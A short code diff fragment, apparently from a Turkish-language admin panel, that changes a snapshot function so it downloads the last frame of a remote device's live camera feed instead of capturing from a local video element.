+        if (deviceCamPendingTimer) clearTimeout(deviceCamPendingTimer);
+      }
+      updateDeviceCamUi(`🟢 Cihaz kamerası canlı • ${deviceCamFrameCount} kare`, "live");
     }
 
     function captureTestSnapshot() {
-      const video = document.getElementById("adminLiveCamVideo");
-      if (video && video.srcObject && video.videoWidth) {
-        const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const url = canvas.toDataURL("image/jpeg", 0.92);
-        const a = document.createElement("a");
-        a.href = url;
-        a.download = `cihaz_kamera_test_karesi_${Date.now()}.jpg`;
-        a.click();
-        alert("📸 Canlı kamera test karesi başarıyla çekildi ve bilgisayarınıza indirildi!");
-      } else {
-        startAdminCamera();
+      if (!deviceCamLastFrameUrl) {
+        alert("📸 Önce cihaz kamerasını başlatın, sonra kare indirin.");
+        return;
       }
+      downloadDeviceAttachment(deviceCamLastFrameUrl, `cihaz_kamera_karesi_${Date.now()}.jpg`);
+      alert("📸 Cihaz kamerasının son karesi bilgisayarınıza indirildi.");
     }
 
     // Kural 9: Remote Actions & Destek Uyarısı İlet Butonu
